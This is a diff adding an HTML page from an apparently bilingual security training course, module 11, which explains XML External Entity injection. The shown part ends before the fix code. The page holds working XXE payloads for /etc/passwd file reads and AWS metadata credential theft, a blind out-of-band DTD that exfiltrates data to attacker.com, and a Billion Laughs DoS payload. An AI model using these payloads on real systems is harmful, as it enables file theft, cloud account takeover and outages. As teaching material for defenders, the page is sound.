+        <li><a href="excessive-data-exposure.html" class="vuln-nav-item"><span class="nav-num-badge">06</span> Excessive Data Exposure</a></li>
+        <li><a href="rate-limiting.html" class="vuln-nav-item"><span class="nav-num-badge">07</span> Rate Limiting</a></li>
+        <li><a href="ssrf.html" class="vuln-nav-item"><span class="nav-num-badge">08</span> SSRF</a></li>
+        <li><a href="nosql-injection.html" class="vuln-nav-item"><span class="nav-num-badge">09</span> NoSQL Injection</a></li>
+        <li><a href="command-injection.html" class="vuln-nav-item"><span class="nav-num-badge">10</span> Command Injection</a></li>
+        <li><a href="xxe.html" class="vuln-nav-item active"><span class="nav-num-badge">11</span> XXE</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">12</span> GraphQL Security</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">13</span> Business Logic Issues</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">14</span> CORS Misconfiguration</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">15</span> API Key Security</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">16</span> OAuth &amp; OpenID Security</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">17</span> Webhooks Security</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">18</span> Race Conditions</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">19</span> File Upload Vulnerabilities</a></li>
+        <li><a href="#" class="vuln-nav-item"><span class="nav-num-badge">20</span> Deserialization Issues</a></li>
+      </ul>
+    </aside>
+
+    <!-- ====================================================================
+         MAIN CONTENT AREA
+         ==================================================================== -->
+    <main class="dashboard-main">
+
+      <!-- Top Action Bar -->
+      <div class="main-top-actionbar">
+        <div style="font-size: 0.84rem; color: #94a3b8;">
+          <a href="index.html" style="color:#38bdf8; text-decoration:none;">Modules</a> &rsaquo;
+          <span>11 / 20 XML External Entity (XXE) Injection</span>
+        </div>
+        <div style="display:flex; align-items:center; gap:12px;">
+          <!-- Dual Language Switcher -->
+          <div class="lang-switch-wrapper">
+            <span class="lang-label active" id="lbl-hi">Hindi</span>
+            <label class="switch">
+              <input type="checkbox" id="langToggle">
+              <span class="slider"></span>
+            </label>
+            <span class="lang-label" id="lbl-en">English</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Hero Top Grid: Title/Lead on Left, Interactive Simulation on Right -->
+      <section class="hero-top-grid">
+        <div>
+          <div class="category-tag-row">
+            <span class="pill-index-tag">11</span>
+            <span class="pill-category-name">XML Parser &amp; DTD Processing Flaws</span>
+          </div>
+
+          <h1 class="main-vuln-h1">
+            XML External Entity<br>
+            <span class="title-blue">(XXE) Injection</span>
+          </h1>
+
+          <p class="main-vuln-desc">
+            <span class="lang-hi">XML External Entity (XXE) injection tab hota hai jab ek backend API endpoint kisi user-supplied XML document ko weakly-configured parser se evaluate karta hai, jisme Document Type Definition (DTD) aur external general entities enabled hoti hain. Attacker <code>&lt;!ENTITY&gt;</code> ke zariye server ke internal files (<code>file:///etc/passwd</code>) read kar sakta hai, internal services par SSRF kar sakta hai, ya Blind OOB DTD se sensitive data exfiltrate kar sakta hai.</span>
+            <span class="lang-en">XML External Entity (XXE) injection occurs when an API endpoint parses untrusted XML input using a parser whose Document Type Definition (DTD) and external entity resolution features remain enabled. An adversary injects malicious <code>&lt;!ENTITY&gt;</code> definitions to extract arbitrary local server files (such as <code>/etc/passwd</code>), forge internal SSRF HTTP queries to cloud metadata endpoints, or execute Out-Of-Band (OOB) exfiltration.</span>
+          </p>
+
+          <!-- Meta tags row -->
+          <div class="meta-tags-row">
+            <span class="meta-chip danger">
+              <span class="badge-dot" style="background:#ef4444; width:6px; height:6px; border-radius:50%; display:inline-block;"></span> Critical Arbitrary File Read &amp; SSRF (CVSS 8.6)
+            </span>
+            <span class="meta-chip info">
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
+              CWE-611 / OWASP API8:2023
+            </span>
+            <span class="meta-chip purple">
+              ★ DTD &amp; XML Parser Entity Expansion
+            </span>
+          </div>
+
+          <!-- Highlight Insight Quote Bubble -->
+          <div class="quote-bubble">
+            <div class="quote-icon-box">💡</div>
+            <div>
+              <span class="lang-hi"><strong>Rohan's Architecture Rule:</strong> "XML standard legacy features se bhara hai. Agar tumhare parser me <code>resolve_entities=False</code> ya <code>defusedxml</code> nahi hai, toh tumhara client request body nahi, server ka confidential filesystem read kar raha hai!"</span>
+              <span class="lang-en"><strong>Rohan's Architecture Rule:</strong> "The XML specification carries dangerous legacy defaults. Unless your parser explicitly sets <code>resolve_entities=False</code> or uses safe libraries like <code>defusedxml</code>, attackers are not submitting business data—they are reading your internal filesystem!"</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Right Box: Interactive Hero Widget (Exact Parity with Module 01 BOLA Design) -->
+        <div class="hero-glass-graphic" id="xxeHeroWidget">
+          <div class="hero-widget-header">
+            <div class="hero-widget-badge">
+              <span class="pulse-live-dot"></span>
+              <span class="hero-badge-title">Interactive Attack Flow</span>
+            </div>
+            <div class="hero-sim-pills">
+              <button type="button" class="hero-sim-btn" id="btnXxeNormal" title="Show Normal XML Document">
+                <span>👤</span> <span>Normal XML</span>
+              </button>
+              <button type="button" class="hero-sim-btn active exploit" id="btnXxeExploit" title="Show XXE Entity Exploit">
+                <span>⚡</span> <span>XXE Exploit (&amp;xxe;)</span>
+              </button>
+            </div>
+          </div>
+
+          <div class="hero-widget-body">
+            <div class="attacker-graphic-node" id="xxeAttackerNode">
+              <div class="attacker-avatar-circle" id="xxeAttackerAvatar">🥷</div>
+              <div class="attacker-label" id="xxeAttackerLabel">Rohan (Attacker)</div>
+              <div class="attacker-sub" id="xxeAttackerSub">SYSTEM "/etc/passwd"</div>
+            </div>
+
+            <div class="graphic-center-flow">
+              <div class="graphic-url-pill" id="xxeUrlPill">
+                <span class="m-verb" id="xxeVerb" style="color:#ef4444; font-weight:700;">POST</span> <span class="m-path" id="xxePath">/api/v1/xml/order</span>
+              </div>
+              <div class="graphic-swap-box" id="xxeSwapBox">
+                <span class="swap-id-badge from" id="xxeBadgeFrom">&lt;name&gt;Om&lt;/name&gt;</span>
+                <span class="swap-arrow-icon" id="xxeSwapArrow" style="color:var(--text-dim); font-size:0.8rem;">➔</span>
+                <span class="swap-id-badge to" id="xxeBadgeTo">&amp;xxe;</span>
+              </div>
+              <div class="flow-beam-track" id="xxeBeamTrack">
+                <div class="flow-beam-particle exploit" id="xxeBeamParticle"></div>
+              </div>
+              <span class="flow-state-label" id="xxeFlowStateText" style="color:#f87171;">DTD External Entity Resolved</span>
+            </div>
+
+            <div class="target-profile-card exploit" id="xxeTargetCard">
+              <div class="target-card-top">
+                <h4 id="xxeTargetName">XML Core Parser</h4>
+                <span class="target-pill-status breach" id="xxeTargetStatus">HTTP 200</span>
+              </div>
+              <p id="xxeTargetField1">Entity: <code style="color:#f87171;">&amp;xxe;</code></p>
+              <p id="xxeTargetField2">Resolved: <code style="color:#ef4444;">/etc/passwd</code></p>
+              <p id="xxeTargetField3">Status: <code style="color:#ef4444;">root:x:0:0...</code></p>
+              <span class="unauth-note" id="xxeTargetNote">🚨 Local File Disclosure</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Tab Underline Navigation Bar -->
+      <div class="tabs-underline-nav-wrapper">
+        <nav class="tabs-underline-nav">
+          <button type="button" class="tab-underline-btn active" data-tab="tab-overview">📖 1. Overview</button>
+          <button type="button" class="tab-underline-btn" data-tab="tab-how-it-works">⚙️ 2. How It Works</button>
+          <button type="button" class="tab-underline-btn" data-tab="tab-scenarios">🎯 3. Attack Scenarios</button>
+          <button type="button" class="tab-underline-btn" data-tab="tab-code">💻 4. Code &amp; Fix</button>
+          <button type="button" class="tab-underline-btn" data-tab="tab-checklist">📋 5. Review Checklist</button>
+          <button type="button" class="tab-underline-btn" data-tab="tab-lab">⚡ 6. Live Lab</button>
+          <button type="button" class="tab-underline-btn" data-tab="tab-questions">❓ 7. FAQ</button>
+        </nav>
+      </div>
+
+      <!-- ====================================================================
+           TAB 1: OVERVIEW (Deep Foundations, Architecture & Engineering Dialogue)
+           ==================================================================== -->
+      <div class="tab-content active" id="tab-overview">
+        <div class="card-panel">
+          <div class="card-title-badge-row">
+            <div class="blue-circle-num">1</div>
+            <h2 class="panel-header-title">
+              <span class="lang-hi">XML External Entity (XXE) Injection: Mool Siddhant &amp; Overview</span>
+              <span class="lang-en">XML External Entity (XXE) Injection: Architectural Foundations</span>
+            </h2>
+          </div>
+
+          <div class="def-lead-title">
+            <span class="lang-hi">1.1 XML Document Structure aur DTD External Entities Kya Hain?</span>
+            <span class="lang-en">1.1 What is XML Structure, DTD, and External Entity Resolution?</span>
+          </div>
+
+          <p>
+            <span class="lang-hi">XML (Extensible Markup Language) ek structured data format hai jo B2B integrations, invoice processing, SOAP web services, aur legacy enterprise APIs me heavily use hota hai. XML specification me ek feature hota hai jise <strong>DTD (Document Type Definition)</strong> kehte hain. DTD ka kaam document ka schema validate karna aur <strong>Entities</strong> define karna hota hai.</span>
+            <span class="lang-en">XML (Extensible Markup Language) is a hierarchical document format ubiquitously deployed in B2B integrations, financial invoices, SAML tokens, and SOAP endpoints. The XML standard specifies <strong>Document Type Definitions (DTD)</strong> to declare document grammar and reusable variables known as <strong>Entities</strong>.</span>
+          </p>
+
+          <p>
+            <span class="lang-hi">Entities do tarah ki hoti hain: <strong>Internal Entities</strong> (jo XML ke andar hi text replace karti hain) aur <strong>External Entities</strong> (jo kisi external URI ya local file path se content load karti hain using the <code>SYSTEM</code> identifier). Jab ek backend XML parser bina strict configuration ke external entity resolve karta hai, tab attacker arbitrary system files read kar sakta hai ya internal networks me SSRF trigger kar sakta hai.</span>
+            <span class="lang-en">Entities comprise <strong>Internal Entities</strong> (in-memory string substitutions) and <strong>External Entities</strong> (which load content from external URIs or local files using the <code>SYSTEM</code> directive). When an XML parser evaluates untrusted external entities, attackers extract server-side files or trigger Server-Side Request Forgery against internal infrastructure.</span>
+          </p>
+
+          <div class="highlight-infobox danger">
+            <span class="lang-hi"><strong>Critical Attack Surface:</strong> Aaj kal zyadatar modern APIs JSON use karti hain, lekin agar API Gateway ya web framework me <code>Content-Type: application/xml</code> accept ho raha hai (Content-Type sniffing), toh attacker JSON request ko XML me covert karke XXE exploit kar sakta hai!</span>
+            <span class="lang-en"><strong>Critical Attack Surface:</strong> While modern APIs favor JSON, if the application framework automatically deserializes XML when receiving <code>Content-Type: application/xml</code>, adversaries simply convert JSON payloads into XML with malicious DTD declarations!</span>
+          </div>
+
+          <!-- Section B: Architectural Flow Diagram -->
+          <div class="def-lead-title" style="margin-top:1.8rem;">
+            <span class="lang-hi">1.2 System Architecture &amp; Entity Resolution Flow</span>
+            <span class="lang-en">1.2 System Architecture &amp; Entity Resolution Flow</span>
+          </div>
+
+          <div style="background:rgba(2, 6, 18, 0.7); border:1px solid rgba(255,255,255,0.08); border-radius:var(--radius-md); padding:1.2rem; margin:1rem 0; font-family:var(--font-mono); font-size:0.8rem; line-height:1.6; color:#94a3b8;">
+            <div style="color:#38bdf8; font-weight:700; margin-bottom:8px;">[Vulnerable XML Processing Pipeline]</div>
+            Attacker Request [XML Body with &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]<br>
+            &nbsp;&nbsp;│<br>
+            &nbsp;&nbsp;▼<br>
+            API Endpoint [POST /api/v1/xml/invoice]<br>
+            &nbsp;&nbsp;│<br>
+            &nbsp;&nbsp;▼<br>
+            XML Parsing Engine [libxml2 / DOMParser / SAXParser with DTD: Enabled]<br>
+            &nbsp;&nbsp;│<br>
+            &nbsp;&nbsp;├─► Entity Resolver resolves 'file:///etc/passwd' via OS Filesystem IO<br>
+            &nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;│<br>
+            &nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└─► Reads /etc/passwd contents into memory<br>
+            &nbsp;&nbsp;│<br>
+            &nbsp;&nbsp;▼<br>
+            Entity Replacement [Substitutes &amp;xxe; with root:x:0:0:root:/root:/bin/bash]<br>
+            &nbsp;&nbsp;│<br>
+            &nbsp;&nbsp;▼<br>
+            API Response Reflects sensitive file data back to Client [HTTP 200 OK]
+          </div>
+
+          <!-- Section C: Engineering Dialogue (Vikram vs Rohan) -->
+          <div class="story-card-box" style="margin-top:1.8rem;">
+            <div class="def-lead-title" style="color:#38bdf8;">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+              <span class="lang-hi">Engineering Dialogue: Vikram (Backend Lead) vs Rohan (Senior Security Architect)</span>
+              <span class="lang-en">Engineering Dialogue: Vikram (Backend Lead) vs Rohan (Senior Security Architect)</span>
+            </div>
+
+            <!-- Turn 1 -->
+            <div class="dialogue-turn">
+              <div class="char-avatar char-vikram">👨‍💻</div>
+              <div class="dialogue-bubble bubble-vikram">
+                <div class="dialogue-header-badge">
+                  <span class="speaker-name vikram">Vikram</span>
+                  <span class="speaker-tag vikram">Backend Lead</span>
+                </div>
+                <span class="lang-hi">"Rohan, hamari procurement API me B2B enterprise clients se XML purchase orders accept karne ke liye maine ek standard endpoint implement kiya hai: <code>POST /api/v1/xml/order</code>. Backend me Python ki <code>lxml.etree.fromstring()</code> use karke XML parse kar raha hoon aur items extract karke database me save kar raha hoon. Code bilkul smooth run kar raha hai!"</span>
+                <span class="lang-en">"Rohan, for our enterprise procurement service, I implemented <code>POST /api/v1/xml/order</code> to ingest B2B purchase orders formatted in XML. The service parses payloads using Python's standard <code>lxml.etree.fromstring()</code> and persists order records into our database. Execution is seamless!"</span>
+              </div>
+            </div>
+
+            <!-- Turn 2 -->
+            <div class="dialogue-turn">
+              <div class="char-avatar char-rohan">🕵️‍♂️</div>
+              <div class="dialogue-bubble bubble-rohan">
+                <div class="dialogue-header-badge">
+                  <span class="speaker-name rohan">Rohan</span>
+                  <span class="speaker-tag rohan">Senior Security Architect</span>
+                </div>
+                <span class="lang-hi">"Vikram, <code>lxml</code> ka default parser external DTD resolution enable rakhta hai! Agar client XML header me <code>&lt;!DOCTYPE order [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;</code> bhej de aur body me <code>&lt;item&gt;&amp;xxe;&lt;/item&gt;</code> reference kare, toh tumhara server disk se <code>/etc/passwd</code> padh kar database aur invoice response me return kar dega!"</span>
+                <span class="lang-en">"Vikram, <code>lxml</code> evaluates external entities by default unless hardened! If a client prepends a DTD declaring <code>&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;</code> and references <code>&amp;xxe;</code> in the document, the parser reads the local <code>/etc/passwd</code> file and reflects it in your response!"</span>
+              </div>
+            </div>
+
+            <!-- Turn 3 -->
+            <div class="dialogue-turn">
+              <div class="char-avatar char-vikram">👨‍💻</div>
+              <div class="dialogue-bubble bubble-vikram">
+                <div class="dialogue-header-badge">
+                  <span class="speaker-name vikram">Vikram</span>
+                  <span class="speaker-tag vikram">Backend Lead</span>
+                </div>
+                <span class="lang-hi">"Lekin Rohan, hamara endpoint toh authenticated hai aur hum response me sirf order confirmation ID return karte hain, raw XML tags return nahi karte! Fir attacker data kaise padhega?"</span>
+                <span class="lang-en">"Wait Rohan, our endpoint requires an API key, and our response only returns a numeric tracking ID—it never echoes the parsed XML back! How could an adversary read sensitive files?"</span>
+              </div>
+            </div>
+
+            <!-- Turn 4 -->
+            <div class="dialogue-turn">
+              <div class="char-avatar char-rohan">🕵️‍♂️</div>
+              <div class="dialogue-bubble bubble-rohan">
+                <div class="dialogue-header-badge">
+                  <span class="speaker-name rohan">Rohan</span>
+                  <span class="speaker-tag rohan">Senior Security Architect</span>
+                </div>
+                <span class="lang-hi">"Ise <strong>Blind Out-Of-Band (OOB) XXE</strong> kehte hain! Attacker parameter entities (<code>%</code>) use karke ek external DTD host karega (jaise <code>http://attacker.com/evil.dtd</code>). Parser jab external DTD load karega, toh wo <code>/etc/passwd</code> ka data URL encode karke attacker ke remote server par HTTP GET request me parameter bana kar bhej dega (jaise <code>http://attacker.com/?data=root:x:...</code>)! Iske alawa, cloud me chal raha parser AWS EC2 IMDSv1 (<code>http://169.254.169.254/latest/meta-data/</code>) se IAM credentials bhi exfiltrate kar sakta hai!"</span>
+                <span class="lang-en">"That is vulnerable to <strong>Blind Out-Of-Band (OOB) XXE</strong>! Attackers leverage parameter entities (<code>%</code>) to fetch a hosted external DTD from their server. The parser loads the DTD, reads <code>/etc/passwd</code>, and issues an egress HTTP GET query transmitting the file contents in a query string! Furthermore, in cloud instances, the parser queries <code>http://169.254.169.254/latest/meta-data/</code> to steal instance IAM credentials!"</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ====================================================================
+           TAB 2: HOW IT WORKS (Parser Internals, DTD Entities & Blind OOB Mechanics)
+           ==================================================================== -->
+      <div class="tab-content" id="tab-how-it-works">
+        <div class="card-panel">
+          <div class="card-title-badge-row">
+            <div class="blue-circle-num">2</div>
+            <h2 class="panel-header-title">
+              <span class="lang-hi">XML Parsers, DTD Architecture &amp; Entity Resolution Mechanics</span>
+              <span class="lang-en">XML Parsers, DTD Architecture &amp; Entity Resolution Mechanics</span>
+            </h2>
+          </div>
+
+          <div class="def-lead-title">
+            <span class="lang-hi">2.1 Document Type Definition (DTD) aur Entity Types</span>
+            <span class="lang-en">2.1 Document Type Definition (DTD) and Entity Taxonomy</span>
+          </div>
+
+          <p>
+            <span class="lang-hi">XML me entities variables ki tarah kaam karti hain. DTD document ke starting me <code>&lt;!DOCTYPE root [...]&gt;</code> block me define ki jati hain. Entities teen mukhya types me categorized hoti hain:</span>
+            <span class="lang-en">In XML, entities function as variables declared inside the <code>&lt;!DOCTYPE root [...]&gt;</code> preamble. They are classified into three primary categories:</span>
+          </p>
+
+          <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(280px, 1fr)); gap:1rem; margin:1rem 0;">
+            <div style="background:rgba(15,23,42,0.6); border:1px solid rgba(255,255,255,0.06); padding:1rem; border-radius:var(--radius-md);">
+              <h4 style="color:#38bdf8; margin:0 0 6px 0; font-size:0.95rem;">1. General Internal Entities</h4>
+              <p style="font-size:0.84rem; color:#cbd5e1; margin:0;">Document ke andar static text replacement: <code>&lt;!ENTITY company "CyberLab Inc."&gt;</code>. Reference: <code>&amp;company;</code>.</p>
+            </div>
+            <div style="background:rgba(15,23,42,0.6); border:1px solid rgba(239,68,68,0.3); padding:1rem; border-radius:var(--radius-md);">
+              <h4 style="color:#f87171; margin:0 0 6px 0; font-size:0.95rem;">2. External General Entities (XXE Vector)</h4>
+              <p style="font-size:0.84rem; color:#cbd5e1; margin:0;">Local files ya remote URIs se data fetch karta hai: <code>&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</code>. Reference: <code>&amp;file;</code>.</p>
+            </div>
+            <div style="background:rgba(15,23,42,0.6); border:1px solid rgba(192,132,252,0.3); padding:1rem; border-radius:var(--radius-md);">
+              <h4 style="color:#c084fc; margin:0 0 6px 0; font-size:0.95rem;">3. Parameter Entities (Blind OOB Vector)</h4>
+              <p style="font-size:0.84rem; color:#cbd5e1; margin:0;">DTD ke andar hi DTD construct karne ke liye use hoti hain: <code>&lt;!ENTITY % param SYSTEM "http://evil.com/dtd"&gt;</code>. Reference: <code>%param;</code>.</p>
+            </div>
+          </div>
+
+          <div class="def-lead-title" style="margin-top:1.8rem;">
+            <span class="lang-hi">2.2 Out-Of-Band (Blind XXE) Exfiltration Pipeline</span>
+            <span class="lang-en">2.2 Out-Of-Band (Blind XXE) Exfiltration Mechanics</span>
+          </div>
+
+          <p>
+            <span class="lang-hi">Jab API response me koi data reflect nahi hota, tab attacker parameter entities aur external DTDs ka use karke sensitive data remote DNS ya HTTP server par push kar deta hai:</span>
+            <span class="lang-en">When APIs suppress parsed output, attackers deploy nested parameter entities hosted on external DTD servers to exfiltrate files over outbound HTTP/DNS requests:</span>
+          </p>
+
+          <div style="background:rgba(2, 6, 18, 0.7); border:1px solid rgba(255,255,255,0.08); border-radius:var(--radius-md); padding:1.2rem; margin:1rem 0; font-family:var(--font-mono); font-size:0.8rem; line-height:1.6; color:#94a3b8;">
+            <strong>Step 1: Attacker hosts 'evil.dtd' on their public server:</strong><br>
+            &lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;<br>
+            &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.com/?stolen=%file;'&gt;"&gt;<br>
+            %eval;<br>
+            %exfil;<br><br>
+            <strong>Step 2: Attacker sends initial injection in API Request:</strong><br>
+            &lt;?xml version="1.0"?&gt;<br>
+            &lt;!DOCTYPE data [<br>
+            &nbsp;&nbsp;&lt;!ENTITY % loadDtd SYSTEM "http://attacker.com/evil.dtd"&gt;<br>
+            &nbsp;&nbsp;%loadDtd;<br>
+            ]&gt;<br>
+            &lt;data&gt;test&lt;/data&gt;<br><br>
+            <strong>Step 3: Target Server parser triggers outgoing HTTP:</strong><br>
+            GET /?stolen=prod-api-worker-01 HTTP/1.1<br>
+            Host: attacker.com
+          </div>
+
+          <div class="def-lead-title" style="margin-top:1.8rem;">
+            <span class="lang-hi">2.3 Billion Laughs Attack (XML Entity Expansion DoS)</span>
+            <span class="lang-en">2.3 Billion Laughs Attack (XML Entity Expansion DoS)</span>
+          </div>
+
+          <p>
+            <span class="lang-hi">External entities ke bina bhi, recursive internal entities se parser ka CPU aur memory 100% exhaust karke Denial of Service (DoS) kiya ja sakta hai. Ise <strong>XML Bomb</strong> ya <strong>Billion Laughs Attack</strong> kehte hain:</span>
+            <span class="lang-en">Even without external entities, recursive internal entity definitions cause exponential memory exhaustion, producing Denial of Service (DoS) termed the <strong>XML Bomb</strong>:</span>
+          </p>
+
+          <div style="background:#020612; border:1px solid rgba(239,68,68,0.3); border-radius:var(--radius-sm); padding:10px 14px; font-family:var(--font-mono); font-size:0.8rem; color:#fca5a5; line-height:1.5;">
+            &lt;!DOCTYPE lolz [<br>
+            &nbsp;&nbsp;&lt;!ENTITY lol "lol"&gt;<br>
+            &nbsp;&nbsp;&lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;<br>
+            &nbsp;&nbsp;&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<br>
+            &nbsp;&nbsp;...<br>
+            &nbsp;&nbsp;&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;<br>
+            ]&gt;<br>
+            &lt;data&gt;&amp;lol9;&lt;/data&gt; &lt;!-- Expands to 3GB in memory from a 1KB payload! --&gt;
+          </div>
+        </div>
+      </div>
+
+      <!-- ====================================================================
+           TAB 3: ATTACK SCENARIOS (Real-World Pentesting Demonstrations)
+           ==================================================================== -->
+      <div class="tab-content" id="tab-scenarios">
+        <div class="card-panel">
+          <div class="card-title-badge-row">
+            <div class="blue-circle-num">3</div>
+            <h2 class="panel-header-title">
+              <span class="lang-hi">Real-World XXE Attack Scenarios &amp; Exploitation Vectors</span>
+              <span class="lang-en">Real-World XXE Attack Scenarios &amp; Exploitation Vectors</span>
+            </h2>
+          </div>
+
+          <!-- Scenario 1 -->
+          <div style="background:rgba(15,23,42,0.6); border:1px solid rgba(255,255,255,0.06); border-radius:var(--radius-md); padding:1.2rem; margin-bottom:1.4rem;">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+              <h4 style="margin:0; color:#f87171; font-size:1.02rem;">Scenario 1: Arbitrary File Read (/etc/passwd &amp; .env Disclosure)</h4>
+              <span class="code-header-badge vulnerable">High Severity</span>
+            </div>
+            <p style="font-size:0.86rem; color:#cbd5e1; margin-bottom:10px;">
+              <span class="lang-hi">E-commerce API me invoice parsing endpoint <code>/api/v1/invoice/upload</code> par user XML file upload karta hai. Attacker custom DTD inject karke local server configuration files read karta hai:</span>
+              <span class="lang-en">An e-commerce API invoice endpoint at <code>/api/v1/invoice/upload</code> parses client-uploaded XML files. An attacker injects a DTD pointing to local system secrets:</span>
+            </p>
+            <div class="check-burp-block">
+POST /api/v1/invoice/upload HTTP/1.1
+Host: api.enterprise-store.com
+Content-Type: application/xml
+Authorization: Bearer eyJhbGciOi...
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE invoice [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;invoice&gt;
+  &lt;invoiceId&gt;INV-8891&lt;/invoiceId&gt;
+  &lt;vendor&gt;&amp;xxe;&lt;/vendor&gt;
+  &lt;total&gt;499.00&lt;/total&gt;
+&lt;/invoice&gt;</div>
+            <div style="background:rgba(16,185,129,0.05); border-left:3px solid #10b981; padding:8px 12px; font-size:0.8rem; color:#94a3b8;">
+              <strong>Response (200 OK):</strong> <code>{"invoiceId":"INV-8891", "vendor":"root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1...", "total": 499.00}</code>
+            </div>
+          </div>
+
+          <!-- Scenario 2 -->
+          <div style="background:rgba(15,23,42,0.6); border:1px solid rgba(255,255,255,0.06); border-radius:var(--radius-md); padding:1.2rem; margin-bottom:1.4rem;">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+              <h4 style="margin:0; color:#38bdf8; font-size:1.02rem;">Scenario 2: Cloud Instance Metadata SSRF (AWS IMDSv1 Credential Theft)</h4>
+              <span class="code-header-badge vulnerable">Critical Severity</span>
+            </div>
+            <p style="font-size:0.86rem; color:#cbd5e1; margin-bottom:10px;">
+              <span class="lang-hi">Cloud EC2 container me host ho rahi API XML document evaluate karte waqt link-local IP <code>http://169.254.169.254</code> par HTTP request fire karti hai, jisse instance IAM role keys exfiltrate ho jati hain:</span>
+              <span class="lang-en">In cloud-hosted services, the entity resolver fetches link-local address <code>http://169.254.169.254</code>, allowing attackers to harvest temporary instance security tokens:</span>
+            </p>
+            <div class="check-burp-block">
+POST /api/v1/profile/import HTTP/1.1
+Host: cloud-microservice.internal
+Content-Type: application/xml
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE user [
+  &lt;!ENTITY aws SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role"&gt;
+]&gt;
+&lt;user&gt;
+  &lt;username&gt;admin&lt;/username&gt;
+  &lt;bio&gt;&amp;aws;&lt;/bio&gt;
+&lt;/user&gt;</div>
+            <div style="background:rgba(16,185,129,0.05); border-left:3px solid #10b981; padding:8px 12px; font-size:0.8rem; color:#94a3b8;">
+              <strong>Impact:</strong> Attacker extracts <code>AccessKeyId</code>, <code>SecretAccessKey</code>, and <code>Token</code> to achieve complete AWS cloud account takeover.
+            </div>
+          </div>
+
+          <!-- Scenario 3 -->
+          <div style="background:rgba(15,23,42,0.6); border:1px solid rgba(255,255,255,0.06); border-radius:var(--radius-md); padding:1.2rem;">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+              <h4 style="margin:0; color:#c084fc; font-size:1.02rem;">Scenario 3: Blind XXE via Out-Of-Band (OOB) DTD Exfiltration</h4>
+              <span class="code-header-badge vulnerable">High Severity</span>
+            </div>
+            <p style="font-size:0.86rem; color:#cbd5e1; margin-bottom:10px;">
+              <span class="lang-hi">Jab API endpoint koi output return nahi karta, tab attacker parameter entities se external DTD invoke karke private configuration file contents Burp Collaborator par exfiltrate karta hai:</span>
+              <span class="lang-en">Where no output is reflected, attackers utilize parameter entities to fetch an external DTD that dispatches system files to a Burp Collaborator instance:</span>
+            </p>
+            <div class="check-burp-block">
+POST /api/v1/reports/generate HTTP/1.1
+Host: reporting.corp.internal
+Content-Type: application/xml
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE report [
+  &lt;!ENTITY % oob SYSTEM "http://bxu8q2...burpcollaborator.net/eval.dtd"&gt;
+  %oob;
+]&gt;
+&lt;report&gt;&lt;id&gt;101&lt;/id&gt;&lt;/report&gt;</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ====================================================================
+           TAB 4: CODE & FIX (Strictly Python Flask & Node.js - No Copy Buttons)
+           ==================================================================== -->
+      <div class="tab-content" id="tab-code">
+        <div class="card-panel">
+          <div class="card-title-badge-row">
+            <div class="blue-circle-num">4</div>
+            <h2 class="panel-header-title">
+              <span class="lang-hi">Secure Engineering &amp; Fixes (Python Flask &amp; Node.js)</span>
+              <span class="lang-en">Secure Engineering &amp; Fixes (Python Flask &amp; Node.js)</span>
+            </h2>
+          </div>
+
+          <p>
+            <span class="lang-hi">XXE vulnerabilities ko prevent karne ka universal golden rule hai: <strong>XML Parser me DTD (Document Type Definition) aur External Entity resolution ko unconditionally disable karein</strong>, ya <code>defusedxml</code> jaisi hardened libraries use karein.</span>
+            <span class="lang-en">The authoritative remediation against XXE is: <strong>Completely disable Document Type Definitions (DTDs) and external entity resolution in your XML parser configuration</strong>, or standardize on safe parsing packages such as <code>defusedxml</code>.</span>
+          </p>
+
+          <!-- Python Flask Implementation -->
